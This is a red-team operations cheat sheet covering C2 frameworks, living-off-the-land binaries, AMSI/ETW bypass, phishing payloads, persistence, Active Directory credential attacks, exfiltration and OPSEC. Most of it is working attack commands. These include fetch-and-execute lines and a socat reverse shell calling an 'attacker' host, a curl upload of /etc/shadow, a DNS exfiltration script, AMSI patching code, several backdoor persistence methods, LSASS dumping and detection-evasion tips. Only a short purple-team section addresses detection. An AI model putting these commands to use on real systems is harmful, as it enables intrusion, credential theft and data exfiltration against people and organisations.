# Red Team Ops (Red Team Operations Methodology)

> For authorized security testing, CTF competitions, and educational purposes only.

Red team operations simulate real-world adversaries to test an organization's detection
and response capabilities. This covers command-and-control (C2) infrastructure, living-off-the-land
techniques, defense evasion, persistence mechanisms, lateral movement, credential harvesting,
data exfiltration, and operational security (OPSEC) — following the MITRE ATT&CK framework
structure for adversary emulation.

---

## C2 Frameworks

### Cobalt Strike

```bash
# Cobalt Strike team server setup
./teamserver <team_server_ip> <password> <malleable_c2_profile>

# Listener creation (via GUI or aggressor script)
# HTTPS listener on port 443 with domain fronting
# Beacon configuration:
#   - Sleep: 60s (with 20% jitter)
#   - User-Agent: Mozilla/5.0 (legitimate browser string)
#   - Host header: legitimate-domain.com (CDN fronting)

# Cobalt Strike aggressor script — automated tasking
# on beacon_initial {
#     bsleep($1, 30000, 20);    # 30s sleep, 20% jitter
#     bshell($1, "whoami /all");
#     bshell($1, "net group \"Domain Admins\" /domain");
#     bhashdump($1);
# }

# Generate payloads
# Attacks -> Packages -> Windows Executable (S)
# Attacks -> Packages -> HTML Application
# Attacks -> Web Drive-by -> Scripted Web Delivery

# Post-exploitation
# beacon> sleep 10 20           # 10s sleep, 20% jitter
# beacon> socks 1080            # SOCKS proxy
# beacon> spawn x64             # spawn new beacon
# beacon> inject <pid> x64      # inject into process
# beacon> kerberos_ticket_use   # pass-the-ticket
```

### Sliver C2

```bash
# Install Sliver
curl https://sliver.sh/install | sudo bash

# Start Sliver server
sliver-server

# Generate implant
sliver > generate --mtls <c2_server>:8888 --os windows --arch amd64 \
  --name backdoor --save /output/backdoor.exe

# Generate stager (smaller initial payload)
sliver > generate stager --lhost <c2_server> --lport 8443 --protocol tcp

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443 --domain legit-domain.com

# Interact with sessions
sliver > sessions                    # list active sessions
sliver > use <session_id>           # interact with session
sliver (BACKDOOR) > info            # system info
sliver (BACKDOOR) > getprivs       # current privileges
sliver (BACKDOOR) > ps              # process list
sliver (BACKDOOR) > netstat         # network connections
sliver (BACKDOOR) > execute-assembly /path/to/Rubeus.exe kerberoast

# Pivoting
sliver (BACKDOOR) > pivots tcp --bind 0.0.0.0:9999
sliver > generate --tcp-pivot <pivot_host>:9999
```

### Mythic C2

```bash
# Install Mythic
sudo ./install_docker_ubuntu.sh
sudo ./mythic-cli start

# Access web UI: https://<server>:7443
# Default creds: mythic_admin / random_password (check logs)

# Install agents
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo.git
sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon.git

# Install C2 profiles
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http.git
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/websocket.git

# Create payload via web UI:
# 1. Payloads -> Create Payload
# 2. Select agent (Apollo for Windows, Poseidon for Linux/macOS)
# 3. Configure C2 profile (HTTP, WebSocket, TCP)
# 4. Select commands to include
# 5. Build and download
```

---

## Living-Off-the-Land (LOLBins/GTFOBins)

### Windows LOLBins

```bash
# Download and execute
certutil -urlcache -split -f http://attacker/payload.exe C:\temp\payload.exe
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\temp\payload.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://attacker/payload.exe','C:\temp\payload.exe')"

# Execute without touching disk
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
mshta http://attacker/payload.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")

# Proxy execution (bypass application whitelisting)
rundll32.exe shell32.dll,ShellExec_RunDLL "C:\temp\payload.exe"
msiexec /q /i http://attacker/payload.msi
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\temp\payload.exe"

# File operations
type C:\temp\payload.exe > C:\Windows\Temp\legit.exe:hidden  # ADS hide
expand C:\temp\payload.cab C:\temp\payload.exe
esentutl.exe /y C:\temp\source.exe /d C:\temp\dest.exe /o    # file copy

# Reconnaissance via LOLBins
nltest /dclist:domain.local                                    # domain controllers
dsquery user -name * -limit 0                                  # all AD users
csvde -f users.csv -d "DC=domain,DC=local" -l "cn,mail"       # export AD to CSV
```

### Linux GTFOBins

```bash
# File read (with elevated permissions)
sudo find / -name "*.txt" -exec cat {} \;
sudo awk 'BEGIN {while ((getline line < "/etc/shadow") > 0) print line}'
sudo ed /etc/shadow <<< $'1,$p\nq'

# Reverse shell via GTFOBins
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'

# SUID exploitation
sudo install -m =xs $(which python3) ./python3_suid
./python3_suid -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# File write for persistence
sudo tee /root/.ssh/authorized_keys << 'EOF'
ssh-ed25519 AAAA... attacker
EOF

# Network exfiltration
curl -X POST -d @/etc/shadow http://attacker:8080/exfil
socat TCP:attacker:4444 EXEC:/bin/bash
```

---

## Defense Evasion

### AMSI Bypass (Windows)

```bash
# AMSI (Antimalware Scan Interface) bypass techniques

# PowerShell AMSI bypass — patch AmsiScanBuffer
powershell -c "
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)
"

# Alternative: reflection-based bypass
powershell -c "
\$a = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils')
\$b = \$a.GetField('am'+'siIn'+'itFa'+'iled','NonPublic,Static')
\$b.SetValue(\$null,\$true)
"

# Bypass via CLR hooking (in C#)
# Overwrite AmsiScanBuffer with ret 0 (AMSI_RESULT_CLEAN)
# byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
# Marshal.Copy(patch, 0, amsiAddr, patch.Length);
```

### ETW Patching

```bash
# Event Tracing for Windows (ETW) — disable telemetry
# Patch EtwEventWrite to return immediately

# PowerShell ETW bypass
powershell -c "
\$etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
\$etwField = \$etw.GetField('m_enabled','NonPublic,Instance')
# Disable ETW for the current process
"

# Direct memory patching (C#):
# IntPtr addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
# byte[] patch = { 0xC3 };  // ret
# VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out uint old);
# Marshal.Copy(patch, 0, addr, patch.Length);
```

### Unhooking (Removing EDR Hooks)

```bash
# EDR products hook ntdll.dll functions to monitor API calls
# Unhooking: reload clean ntdll from disk

# PowerShell unhooking concept:
# 1. Read clean ntdll.dll from C:\Windows\System32\ntdll.dll
# 2. Find .text section in clean copy
# 3. Copy clean .text over hooked .text in memory
# This removes all inline hooks placed by EDR

# Syscall-based evasion: call syscalls directly
# Avoids hooked Win32 API entirely
# Tools: SysWhispers, HellsGate, HalosGate

# Process hollowing (avoid scanning)
# 1. Create suspended process (svchost.exe)
# 2. Unmap original executable
# 3. Map malicious code into process space
# 4. Resume thread
# EDR sees svchost.exe process, not malicious binary
```

---

## Initial Access

### Phishing Payloads

```bash
# Macro-enabled document (VBA)
# Sub AutoOpen()
#     Shell "powershell -nop -w hidden -ep bypass -c ""IEX(...)"" "
# End Sub

# ISO/IMG file delivery (bypasses Mark-of-the-Web)
# Package: ISO containing LNK + DLL
mkisofs -o payload.iso -J -R /path/to/payload_files/

# HTML smuggling
# Embed base64 payload in HTML, JavaScript reconstructs and downloads
# <script>
# var payload = atob("TVqQAAMAAAAE...");
# var blob = new Blob([payload], {type: "application/octet-stream"});
# var url = URL.createObjectURL(blob);
# var a = document.createElement("a");
# a.href = url; a.download = "update.exe"; a.click();
# </script>

# OneNote phishing (.one files)
# Embed malicious script behind "Click here" button image
# OneNote doesn't have macro protection like Word/Excel

# QR code phishing
# Generate QR code linking to credential harvester
qrencode -o phish_qr.png "https://login-portal.attacker.com/o365"
```

---

## Persistence Mechanisms

### Windows Persistence

```bash
# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsUpdate" /t REG_SZ /d "C:\temp\payload.exe" /f

# Scheduled task
schtasks /create /tn "SystemHealthCheck" /tr "C:\temp\payload.exe" \
  /sc daily /st 09:00 /ru SYSTEM

# WMI event subscription
# Triggers payload on specific event (user login, process start, etc.)
wmic /namespace:\\root\subscription PATH __EventFilter CREATE \
  Name="PersistFilter", EventNameSpace="root\cimv2", \
  QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"

# DLL search order hijacking
# Place malicious DLL in application directory with name of missing DLL
# Use Process Monitor to find DLL search order gaps

# COM object hijacking
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" \
  /ve /t REG_SZ /d "C:\temp\payload.dll" /f

# Golden ticket persistence (requires krbtgt hash)
mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /krbtgt:<hash> /ptt"

# Service creation
sc create "WindowsHealthService" binPath= "C:\temp\payload.exe" start= auto
sc start WindowsHealthService
```

### Linux Persistence

```bash
# Cron job
echo "*/5 * * * * /tmp/.hidden/beacon" >> /var/spool/cron/crontabs/root
# Or system-wide:
echo "*/5 * * * * root /tmp/.hidden/beacon" >> /etc/crontab

# Systemd service
cat > /etc/systemd/system/health-monitor.service << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
ExecStart=/opt/.monitor/beacon
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
systemctl enable health-monitor.service
systemctl start health-monitor.service

# SSH authorized keys
echo "ssh-ed25519 AAAA... attacker" >> /root/.ssh/authorized_keys

# .bashrc / .profile backdoor
echo '/tmp/.hidden/beacon &' >> /root/.bashrc

# PAM backdoor (auth bypass)
# Modify pam_unix.so to accept a hardcoded password
# Or add a PAM module that logs credentials

# LD_PRELOAD persistence
echo "/tmp/.hidden/evil.so" >> /etc/ld.so.preload
# evil.so hooks libc functions and spawns beacon on any exec
```

---

## Credential Access

### Active Directory Attacks

```bash
# Kerberoasting — request service tickets, crack offline
impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.local/user:password \
  -outputfile kerberoast_hashes.txt
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# AS-REP Roasting — target accounts without pre-auth
impacket-GetNPUsers -dc-ip <dc_ip> domain.local/ -usersfile users.txt \
  -outputfile asrep_hashes.txt -format hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# DCSync — replicate domain controller (requires replication rights)
impacket-secretsdump -just-dc domain.local/admin:password@<dc_ip>
# Or via Mimikatz:
# lsadump::dcsync /user:krbtgt /domain:domain.local

# NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# Combine with Responder for hash capture
responder -I eth0 -wrfb

# Password spraying (careful with lockout policies)
crackmapexec smb <dc_ip> -u users.txt -p 'Spring2024!' --continue-on-success

# LSASS credential dump (multiple methods)
# Mimikatz: sekurlsa::logonpasswords
# ProcDump: procdump -ma lsass.exe lsass.dmp
# comsvcs.dll: rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> out.dmp full
# Nanodump: nanodump --write out.dmp
```

---

## Data Exfiltration

### Exfiltration Channels

```bash
# DNS exfiltration
# Encode data in DNS queries to attacker-controlled nameserver
python3 -c "
import base64
data = open('/etc/shadow','rb').read()
encoded = base64.b32encode(data).decode()
# Split into 63-char labels (DNS label limit)
chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
for i, chunk in enumerate(chunks):
    # nslookup {chunk}.{seq}.exfil.attacker.com
    print(f'{chunk}.{i}.exfil.attacker.com')
"

# HTTPS exfiltration (blends with normal traffic)
curl -X POST https://attacker.com/upload \
  -H "Content-Type: application/octet-stream" \
  --data-binary @sensitive_data.tar.gz

# Cloud storage exfiltration
# Upload to attacker-controlled S3/Azure Blob/GCS
aws s3 cp sensitive_data.tar.gz s3://attacker-bucket/ --no-sign-request

# ICMP exfiltration (covert channel)
# Encode data in ICMP echo request payload
python3 -c "
from scapy.all import *
data = b'exfiltrated_data'
pkt = IP(dst='attacker.com')/ICMP()/Raw(data)
send(pkt)
"

# Steganography
# Hide data in image files
steghide embed -cf cover.jpg -ef secret.txt -p password
# Exfiltrate via normal-looking image upload
```

---

## Adversary Simulation Frameworks

### MITRE CALDERA

```bash
# Install CALDERA
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt
python server.py --insecure

# Access UI: http://localhost:8888 (default: admin/admin)

# Deploy agent (Sandcat)
# Download agent from CALDERA server
curl -s http://caldera:8888/file/download -d '{"platform":"linux","file":"sandcat.go"}' \
  -o sandcat
chmod +x sandcat
./sandcat -server http://caldera:8888 -group red -v

# Run adversary profile
# UI: Operations -> Create -> Select adversary profile
# Built-in profiles mapped to ATT&CK techniques
```

### Atomic Red Team

```bash
# Install Invoke-AtomicRedTeam (PowerShell)
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# List available tests for a technique
Invoke-AtomicTest T1059.001 -ShowDetails

# Execute specific ATT&CK technique
Invoke-AtomicTest T1059.001     # PowerShell execution
Invoke-AtomicTest T1003.001     # LSASS memory dump
Invoke-AtomicTest T1053.005     # Scheduled task persistence

# Run and cleanup
Invoke-AtomicTest T1059.001 -Cleanup

# Run all tests for a tactic
Invoke-AtomicTest T1059 -TestNumbers 1,2,3

# Linux atomic tests
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1053.003/T1053.003.md
```

---

## Operational Security (OPSEC)

### Infrastructure Setup

```bash
# Redirector setup (hide C2 server)
# Use Apache mod_rewrite or nginx on cloud VPS

# nginx redirector config
cat << 'NGINX' > /etc/nginx/sites-available/redirector
server {
    listen 443 ssl;
    server_name legit-domain.com;
    ssl_certificate /etc/letsencrypt/live/legit-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/legit-domain.com/privkey.pem;

    # Only forward traffic matching C2 profile
    location /api/v2/update {
        proxy_pass https://c2-server:443;
        proxy_ssl_verify off;
    }

    # All other traffic goes to legitimate site
    location / {
        proxy_pass https://real-legitimate-site.com;
    }
}
NGINX

# Domain categorization
# Age domains 30+ days before use
# Categorize via Bluecoat/McAfee as "business" or "technology"
# Use expired domains with existing reputation

# OPSEC checklist:
# - Separate infrastructure per engagement (no reuse)
# - Use VPN/Tor for all operator traffic to C2
# - Rotate IPs and domains on detection
# - Time operations to target's business hours (blend in)
# - Match C2 traffic patterns to normal enterprise traffic
# - Remove metadata from all payloads and documents
# - Use encrypted channels for all team communication
# - Log all operator activity for deconfliction
```

### Purple Teaming

```bash
# Purple team collaboration workflow:
# 1. Red team announces technique (ATT&CK ID)
# 2. Blue team enables logging/monitoring
# 3. Red team executes technique
# 4. Blue team verifies detection
# 5. Gap analysis — tune detection rules
# 6. Re-test until detection is confirmed
# 7. Document detection capability

# Detection mapping:
# ATT&CK Technique | Data Source | Detection Logic | Alert Name
# T1059.001        | PowerShell logs (4104) | Encoded command | Suspicious PS
# T1003.001        | Sysmon (ProcessAccess) | lsass.exe target | LSASS Access
# T1053.005        | Security log (4698) | New scheduled task | Persistence

# Validate detection coverage:
# For each ATT&CK technique used:
#   1. Was telemetry generated?
#   2. Was an alert triggered?
#   3. Was the alert actionable?
#   4. What was the response time?
```

---

## Tips

- Always use redirectors between your C2 and target networks — direct connections to your server are trivially attributable
- Vary your C2 sleep times with jitter to avoid detection by beaconing analysis; consistent intervals are a dead giveaway
- Use process injection into long-lived legitimate processes (svchost, explorer) rather than spawning new suspicious processes
- Stage credentials in memory rather than writing to disk; disk-based credential files trigger endpoint detection
- Match your C2 traffic to the target's normal traffic patterns — if they use Teams, make your traffic look like Teams
- Rotate domains and IPs immediately when you suspect detection rather than waiting for confirmation
- Document every action with timestamps for the engagement report and to support purple team analysis
- Use separate operator workstations for each engagement; cross-contamination between clients is an OPSEC failure
- Test all payloads against current AV/EDR solutions in a lab before deploying in the target environment
- Maintain a deconfliction process with the client's security team to prevent incident response actions against your activity

---

## See Also

- pentest-methodology
- metasploit
- lateral-movement
- mitre-attack

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cobalt Strike Documentation](https://www.cobaltstrike.com/support)
- [Sliver C2 Wiki](https://github.com/BishopFox/sliver/wiki)
- [Mythic C2 Documentation](https://docs.mythic-c2.net/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [MITRE CALDERA](https://caldera.mitre.org/)
- [The Red Team Field Manual (RTFM)](https://www.amazon.com/Red-Team-Field-Manual-v2/dp/B09V4JHXVM)
